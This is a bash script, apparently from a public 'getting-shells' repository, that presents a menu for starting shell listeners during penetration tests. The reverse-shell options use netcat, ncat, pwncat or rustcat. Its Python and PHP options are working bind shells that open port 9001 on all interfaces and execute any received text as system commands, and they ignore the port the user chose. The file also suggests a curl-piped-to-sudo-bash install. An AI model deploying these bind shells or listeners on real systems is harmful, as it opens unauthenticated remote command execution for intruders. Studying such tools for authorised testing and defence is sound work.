#!/bin/bash

#
# version 1
# date 2021-11-22
# https://github.com/davift/getting-shells
#

clear

allowAbort=true;
myInterruptHandler()
{
    if $allowAbort; then
        exit 1;
    fi;
}

trap myInterruptHandler SIGINT;

####

function box_out() {
  input_char=$(echo "$@" | wc -c)
  line=$(for i in `seq 0 $input_char`; do printf "─"; done)
  tput bold
  tput setaf 7
  space=${line//─/ }
  echo "┌${line}┐"
  printf '│ ' ; echo -n "$@"; printf "%s\n" ' │';
  echo "└${line}┘"
  tput sgr 0
}

function box_title() {
  tput bold
  tput setaf 6
  echo "┌─────────────────────────────┐"
  echo "│                             │"
  echo "│  GETTING SHELLS - LISTENER  │"
  echo "│                             │"
  echo "└─────────────────────────────┘"
  tput sgr0
}

function box_exited() {
  tput bold
  tput setaf 6
  echo "┌────────┐"
  echo "│ EXITED │"
  echo "└────────┘"
  tput sgr0
  exit 0
}

function box_red() {
#  tput bold
  tput setaf 1
  echo "$@"
  tput sgr0
}

function box_green() {
#  tput bold
  tput setaf 2
  echo "$@"
  tput sgr0
}

####

box_title;

box_out "Local Addresses"
#tput bold
tput setaf 1
echo "`curl -s 'http://ip.me'` (public IP)"
echo "`hostname -I``hostname`"
echo "127.0.0.1 localhost"
tput sgr0

if [ $(($1)) -ge 1 ]; then
    local_port=$1
else
    read -p "Local port (LP) [1-65535]? " local_port
fi

tput bold
box_red "Listening port: $local_port"

box_out "Testing..."

which nc > /dev/null && box_green "Original NetCat - OK" || box_red "Original NetCat"
which ncat > /dev/null && box_green "NMAP's NetCat - OK" || box_red "NMAP's NetCat (sudo apt install ncat -y)"
which pwncat > /dev/null && box_green "PwnCat - OK" || box_red "PwnCat (pip install pwncat)"
which rcat > /dev/null && box_green "RustCat - OK" || box_red "RustCat (curl -s https://raw.githubusercontent.com/robiot/rustcat/main/pkg/debian-install.sh | sudo bash)"
which python3 > /dev/null && box_green "Python3 - OK" || box_red "Python3 (sudo apt install python3 -y)"
which php > /dev/null && box_green "PHP - OK" || box_red "PHP (sudo apt install php -y)"

box_out "Listeners"

PS3='Selection: '
options=(
"Reverse | Original NetCat   | nc -lvnp LP" \
"Reverse | NMAP's NetCat     | ncat -lvnp LP" \
"Reverse | NMAP's NetCat SSL | ncat --ssl -lv LP" \
"Reverse | PwnCat (advanced) | pwncat -l LP" \
"Reverse | RustCat           | rcat -lHp LP" \
"Blind   | Python3           | python3 -c 'exec(..." \
"Blind   | PHP               | php -r '\$s=socket..." \
"EXIT")
select opt in "${options[@]}"
do
    case $opt in
        "${options[0]}")
            allowAbort=false;
            box_red "Starting NetCat..."
            nc -lvnp $local_port || box_red "...listener aborted!";
            allowAbort=true;
            ;;
        "${options[1]}")
            allowAbort=false;
            box_red "Starting NMAP's NetCat..."
            ncat -lvnp $local_port || box_red "...listener aborted!";
            allowAbort=true;
            ;;
        "${options[2]}")
            allowAbort=false;
            box_red "Starting NMAP's NetCat SSL..."
            ncat --ssl -lv $local_port || box_red "...listener aborted!";
            allowAbort=true;
            ;;
        "${options[3]}")
            allowAbort=false;
            box_red "Starting PwnCat..."
            pwncat -l $local_port || box_red "...listener aborted!";
            allowAbort=true;
            ;;
        "${options[4]}")
            allowAbort=false;
            box_red "Starting RustCat..."
            rcat -lHp $local_port || box_red "...listener aborted!";
            allowAbort=true;
            ;;
        "${options[5]}")
            allowAbort=false;
            box_red "Starting Python3..."
            python3 -c 'exec("""import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind(("0.0.0.0",9001));s1.listen(1);c,a=s1.accept();while True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);c.sendall(p.stdout.read()+p.stderr.read())""")' || box_red "...listener aborted!";
            allowAbort=true;
            ;;
        "${options[6]}")
            allowAbort=false;
            box_red "Starting PHP..."
            php -r '$s=socket_create(AF_INET,SOCK_STREAM,SOL_TCP);socket_bind($s,"0.0.0.0",9001);socket_listen($s,1);$cl=socket_accept($s);while(1){if(!socket_write($cl,"$ ",2))exit;$in=socket_read($cl,100);$cmd=popen("$in","r");while(!feof($cmd)){$m=fgetc($cmd);socket_write($cl,$m,strlen($m));}}' || box_red "...listener aborted!";
            allowAbort=true;
            ;;
        "${options[7]}")
            break
            ;;
        *)
            ;;
    esac
done

box_exited;

exit 0
